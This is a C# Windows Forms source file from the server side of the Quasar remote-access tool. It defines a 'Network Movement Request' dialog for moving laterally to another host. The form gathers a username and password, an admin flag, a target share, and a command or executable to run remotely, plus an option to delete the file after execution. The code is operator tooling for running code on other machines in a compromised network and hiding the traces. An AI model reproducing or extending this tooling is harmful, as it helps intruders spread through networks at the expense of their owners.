using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

using Quasar.Common.Models.Network;
using Quasar.Server.Networking;
using Quasar.Server.Helper;

namespace Quasar.Server.Controls
{
    public partial class FrmNetworkMovementRequest : Form
    {
        [DllImport("shell32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
            out int pNumArgs);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LocalFree(IntPtr hMem);

        public static (string fileName, string arguments) ParseCommandLine(string commandLine)
        {
            int numArgs;
            IntPtr argvPtr = CommandLineToArgvW(commandLine, out numArgs);
            if (argvPtr == IntPtr.Zero)
            {
                throw new System.ComponentModel.Win32Exception();
            }
            try
            {
                string[] args = new string[numArgs];
                for (int i = 0; i < numArgs; i++)
                {
                    IntPtr argPtr = Marshal.ReadIntPtr(argvPtr, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(argPtr);
                }
                if (args.Length == 0)
                    return (null, null);
                string fileName = args[0];
                string arguments = string.Join(" ", args, 1, args.Length - 1);
                return (fileName, arguments);
            }
            finally
            {
                LocalFree(argvPtr);
            }
        }

        private Client client { get; set; }
        public NetworkMovementRequest Request { get; private set; }
        private AddressEntity Address { get; set; }
        private ShareEntity[] Shares { get; set; }
        public bool IsCommand { get; private set; }
        public bool IsFile { get; private set; }
        public FrmNetworkMovementRequest(Client client, AddressEntity Address, ShareEntity[] Shares, bool IsCommand, bool IsFile)
        {
            InitializeComponent();
            this.client = client;
            this.Address = Address;
            this.Shares = Shares;
            this.IsCommand = IsCommand;
            this.IsFile = IsFile;
            labelAction.Visible = false;
            txtInput.Visible = false;
            btnOpenFile.Visible = false;
            txtPassword.UseSystemPasswordChar = true;
            cmbShares.Enabled = false;
            if (IsCommand)
            {
                labelAction.Visible = true;
                txtInput.Visible = true;
                labelAction.Text = "Command:";
            }
            if (IsFile)
            {
                labelAction.Visible = true;
                txtInput.Visible = true;
                txtInput.ReadOnly = true;
                labelAction.Text = "File Path:";
                btnOpenFile.Visible = true;
            }
            foreach (ShareEntity share in Shares)
            {
                cmbShares.Items.Add(share.ShareName);
            }
            if (cmbShares.Items.Count > 0)
            {
                cmbShares.Text = cmbShares.Items[0].ToString();
            }
        }

        private void btnOpenFile_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select an executable...";
                ofd.InitialDirectory = System.Reflection.Assembly.GetExecutingAssembly().Location;
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                ofd.Filter = "Executable File (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtInput.Text = ofd.FileName;
                }
            }
        }

        private void chkShowPass_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.UseSystemPasswordChar = !chkShowPass.Checked;
        }

        private void chkUseShares_CheckedChanged(object sender, EventArgs e)
        {
            cmbShares.Enabled = chkUseShares.Checked;
        }

        private void btnDone_Click(object sender, EventArgs e)
        {
            string command = "";
            string args = "";
            if (this.IsCommand)
            {
                (command, args) = ParseCommandLine(txtInput.Text);
            }
            Request = new NetworkMovementRequest
            {
                Username = txtUsername.Text,
                Password = txtPassword.Text,
                AsAdmin = chkAsAdmin.Checked,
                DeleteAfter = chkDeleteAfter.Checked,
                UseShare = chkUseShares.Checked,
                SharePath = cmbShares.Text,
                Command = command,
                Argument = args,
                FilePath = txtInput.Text
            };
            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.Cancel;
            this.Close();
        }

        private void FrmNetworkMovementRequest_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (this.Request == null)
            {
                this.DialogResult = DialogResult.Cancel;
            }
        }

        private void FrmNetworkMovementRequest_Load(object sender, EventArgs e)
        {
            string value = IsCommand ? "Execute Command" : (IsFile ? "Execute File" : "Move To");
            this.Text = WindowHelper.GetWindowTitle("Network Movement Request", client) + $" => {Address.Address} - {value}";
        }
    }

    public class NetworkMovementRequest
    {
        public string Username { get; set; }
        public string Password { get; set; }
        public bool AsAdmin { get; set; }
        public bool DeleteAfter { get; set; }
        public bool UseShare { get; set; }
        public string SharePath { get; set; }
        public string Command { get; set; }
        public string Argument { get; set; }
        public string FilePath { get; set; }
    }
}
